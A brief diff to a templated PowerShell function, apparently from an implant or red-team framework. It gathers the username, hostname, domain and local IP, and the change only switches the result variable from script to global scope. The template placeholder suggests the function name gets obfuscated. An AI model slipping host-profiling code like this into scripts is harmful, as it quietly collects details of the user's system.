@@ -19,6 +19,6 @@ function {{ ron.obf_collect_sysinfo }}(){
     $d = (Get-WmiObject -Class Win32_ComputerSystem).Workgroup
     $a = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address
     $final_str = "Username: "+$env:UserName+"`nHostname: "+$h+"`nDomain: "+$d+"`nLocal IP: "+$a
-    $Script:tr = $final_str
+    $global:tr = $final_str
 }'''
         return var
